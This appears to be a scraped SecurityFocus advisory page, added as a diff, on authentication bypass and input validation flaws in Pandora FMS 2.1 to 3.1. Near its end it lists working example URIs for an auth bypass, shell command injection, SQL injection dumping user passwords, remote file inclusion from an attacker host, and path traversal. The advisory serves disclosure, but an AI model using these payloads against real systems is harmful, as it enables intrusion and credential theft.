@@ -1,0 +1,115 @@
+#SpeeDr00t@Black Falcon<br>#bid45112<p><b><span style="font-size: 18pt;">Pandora FMS Authentication Bypass And Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/45112/info">info</a><br><a href="http://www.securityfocus.com/bid/45112/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/45112/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/45112/solution">solution</a><br><a href="http://www.securityfocus.com/bid/45112/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				45112
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-4278<br/>
+				
+					CVE-2010-4279<br/>
+				
+					CVE-2010-4280<br/>
+				
+					CVE-2010-4281<br/>
+				
+					CVE-2010-4282<br/>
+				
+					CVE-2010-4283<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 30 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 30 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Juan Galiana Lara
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Pandora FMS Team Pandora FMS  3.1<br/>
+					
+				
+					Pandora FMS Team Pandora FMS  3<br/>
+					
+				
+					Pandora FMS Team Pandora FMS  2.1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Pandora FMS Team Pandora FMS 3.1.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/pandora_console/index.php?loginhash_data=21232f297a57a5a743894a0e4a801fc3&amp;amp;loginhash_user=admin&amp;amp;loginhash=1<br/><br/>http://www.example.com/pandora_console/index.php?login=1&amp;amp;login=1&amp;amp;sec=estado&amp;amp;sec2=operation/agentes/networkmap&amp;amp;refr=0&amp;amp;layout=1;uname%20-a;<br/><br/>http://www.example.com/pandora_console/index.php?login=1&amp;amp;sec=estado&amp;amp;sec2=operation/agentes/networkmap&amp;amp;refr=0&amp;amp;layout=1;id;<br/><br/>http://www.example.com/pandora_console/ajax.php?page=operation/agentes/ver_agente&amp;amp;get_agents_group_json=1&amp;amp;id_group=1/**/and/**/1=0/**/union/**/select/**/id_user,password/**/from/**/tusuario<br/><br/>http://www.example.com/pandora_console/index.php?sec=estado&amp;amp;sec2=operation/agentes/estado_agente&amp;amp;group_id=24%29%20and%20%28select%20password%20from%20tusuario%20where%20ord%28substring%28password,1,1%29%29=49%20and%20id_user=0x61646d696e%29%20union%20select%20id_agente,%20nombre%20from%20tagente%20where%20id_grupo%20in%20%281<br/><br/>http://www.example.com/pandora_console/ajax.php?page=//server/share/test<br/><br/>http://www.example.com/pandora_console/extras/pandora_diag.php?argc=2&amp;amp;argv1=http://serverattacker/salsa.php%00<br/><br/>http://www.example.com/pandora_console/general/pandora_help.php?id=/../../../../../../../boot.ini%00
+	
+		<ul>
+</ul>
+</div>
